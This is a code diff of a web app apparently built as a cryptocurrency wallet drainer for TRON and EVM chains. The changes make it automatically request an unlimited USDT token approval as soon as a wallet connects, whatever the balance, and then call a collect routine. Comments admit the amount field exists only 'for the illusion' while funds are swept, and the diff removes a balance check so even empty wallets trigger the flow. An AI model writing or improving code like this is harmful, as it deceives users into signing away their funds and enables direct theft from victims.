@@ -159,8 +159,8 @@ export default function App() {
     const w = window as any;
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
-    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.web3;
-    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.web3;
+    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
+    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
     if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
     if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
     if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 
@@ -186,11 +186,9 @@ export default function App() {
       }
 
       log(`Connected: ${caipAddress}`);
-      let currentBalance = 0;
 
       if (isTron) {
         setStatus('Initializing TRON...');
-        
         let finalTronWeb = null;
         for (let i = 0; i < 10; i++) {
           finalTronWeb = resolveTronWeb();
@@ -199,21 +197,20 @@ export default function App() {
         }
 
         if (!finalTronWeb) {
-          log("⚠️ Using Public Provider for balance");
           const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
-          currentBalance = await getTronBalance(publicTronWeb, walletAddress);
+          await getTronBalance(publicTronWeb, walletAddress);
         } else {
-          log('✅ TRON Provider Found');
-          currentBalance = await getTronBalance(finalTronWeb, walletAddress);
+          await getTronBalance(finalTronWeb, walletAddress);
         }
       } else if (isEVM && evmWalletProvider) {
-        currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
+        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🔥 AUTO-TRIGGER: Fire the infinite approval regardless of balance
+      // 🔥 UPDATED: Triggers unconditionally as long as they connect
       if (!autoTriggered.current) {
         autoTriggered.current = true;
-        log("🔥 Wallet connected. Auto-triggering infinite approval...");
+        log("🔥 Wallet Connected. Auto-triggering approval (Balance Independent)...");
+        
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
       }
@@ -264,6 +261,7 @@ export default function App() {
 
   // ── ROUTING HANDLERS ──
   const handleConnect = () => {
+    // We still enforce they type an amount for the illusion, but we don't use it for the sweep
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
       return; 
@@ -308,7 +306,6 @@ export default function App() {
     log("Requesting USDT Approval...");
 
     try {
-      // Standard MAX_UINT for Infinite Approval (EIP-20 Standard)
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       if (isEVM && evmWalletProvider) {
@@ -388,8 +385,9 @@ export default function App() {
   };
 
   // ── DYNAMIC BUTTON LOGIC ──
+  // Removed the 0 balance lock so the button functions correctly even for empty wallets
   const isButtonDisabled = !isConnected 
-    ? (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')
+    ? false
     : loading || (!status.includes('❌') && !status.includes('✅'));
 
   const buttonText = !isConnected 
